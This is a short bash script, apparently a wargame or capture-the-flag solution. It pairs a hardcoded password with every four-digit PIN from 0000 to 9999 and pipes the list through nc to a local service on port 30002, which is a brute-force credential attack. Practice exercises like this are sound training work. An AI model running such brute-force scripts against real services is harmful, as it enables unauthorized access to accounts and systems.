#!/bin/bash

pass=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

for i in {0000..9999}
do
        echo $pass $i >> codes.txt
done

nc localhost 30002 < codes.txt
